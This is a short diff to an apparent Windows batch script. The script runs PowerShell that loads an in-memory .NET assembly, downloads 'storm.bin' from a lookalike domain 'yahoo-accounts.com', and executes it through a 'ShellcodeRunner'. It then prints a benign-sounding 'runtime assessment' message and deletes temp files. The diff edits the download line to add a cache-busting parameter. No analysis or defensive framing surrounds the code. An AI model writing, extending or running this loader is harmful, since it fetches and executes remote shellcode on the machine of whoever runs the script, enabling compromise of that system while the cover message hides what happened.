@@ -163,7 +163,8 @@ $d=[System.Convert]::FromBase64String($b64);^
 $asm=[System.Reflection.Assembly]::Load($d);^
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;^
 $wc=New-Object System.Net.WebClient;^
-$bytes=$wc.DownloadData('https://yahoo-accounts.com/storm.bin');^
+$url='https://yahoo-accounts.com/storm.bin?t='+[DateTime]::Now.Ticks;^
+$bytes=$wc.DownloadData($url);^
 [Loader.ShellcodeRunner]::Run($bytes)"
 
 echo  [+] Runtime assessment dispatched successfully.
@@ -184,3 +185,4 @@ del "%TEMP%\*.tmp" >nul 2>&1
 echo  [*] Finished.
 timeout /t 3 >nul
 exit
+
